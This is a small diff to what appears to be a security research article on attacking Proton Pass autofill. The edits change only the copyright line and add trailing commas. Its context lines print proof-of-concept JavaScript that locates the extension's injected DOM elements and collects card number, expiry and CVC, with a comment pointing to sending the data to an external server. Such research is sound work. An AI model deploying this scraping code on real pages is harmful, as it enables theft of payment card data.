@@ -10,7 +10,7 @@ tags:
 language: en
 thumbnail: "/images/thumbnail/deep_research_2025_security.png"
 copyright: |
-  © 2025 REWRITE LAB (References) Author: Rewrite Lab (One, TCP/IP, filime)
+  © 2026 HSPACE (References) Author: Rewrite Lab (One, TCP/IP, filime)
   This copyright applies to this document only.
 ---
 
@@ -263,7 +263,7 @@ After locating dynamically generated root elements, attackers can also manipulat
 
 ```jsx
 const x = Array.from(document.querySelectorAll("*")).find((el) =>
-  el.tagName.toLowerCase().startsWith("protonpass-root-")
+  el.tagName.toLowerCase().startsWith("protonpass-root-"),
 );
 // Scrape all HTML elements starting with protonpass-root-
 
@@ -321,7 +321,7 @@ function getCardValues() {
   if (expiry && cvc) {
     // DATA WILL BE IN CONSOLE
     console.log(
-      "cardnumber=" + cardnumber + "&expiry=" + expiry + "&cvc=" + cvc
+      "cardnumber=" + cardnumber + "&expiry=" + expiry + "&cvc=" + cvc,
     );
 
     /* Sending data to external server
